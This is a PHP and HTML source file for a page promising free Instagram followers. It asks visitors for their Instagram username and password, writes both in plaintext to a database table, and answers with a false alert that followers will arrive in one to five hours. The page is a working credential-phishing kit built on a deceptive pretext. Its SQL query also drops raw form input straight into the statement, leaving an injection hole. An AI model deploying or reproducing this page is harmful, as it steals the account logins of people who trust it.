<?php
require 'configure.php';
if(isset($_POST["submit"])){
	$user = $_POST["user"];
	$pass = $_POST["pass"];
	$follower = $_POST["follower"];
	$query = "INSERT INTO insta VALUES('$user','$pass','$follower')";
            mysqli_query($conn,$query);
			
			echo
		"<script> alert('Followers will arrive in 1-5 hours only if passowrd and username is correct') </script>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="login.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<form method="post">
 <div class="co">
      <div class="wrapper">
          <h1>Login</h1>
          <h6></h6> Note: We need your account details only to verify your account.</h6>
          <div class="inpub">
              <p>Instagram Username</p>
              <input type="text" placeholder="Instagram Username" required name="user">
          </div>
          <div class="inpub">
              <p>Instagram Password</p>
              <input type="text" placeholder="Instagram Password" required name="pass">
          </div>
          <div class="inpub">
              <p>Amount of followers</p>
              <input type="number" placeholder="Amount Of Followers" name="follower" required max="1000" min="0">
          </div>
          <button class="btn" type="submit" name="submit">Get Followers</button>
       </div>
 </div>
 </form>
</body>
</html>
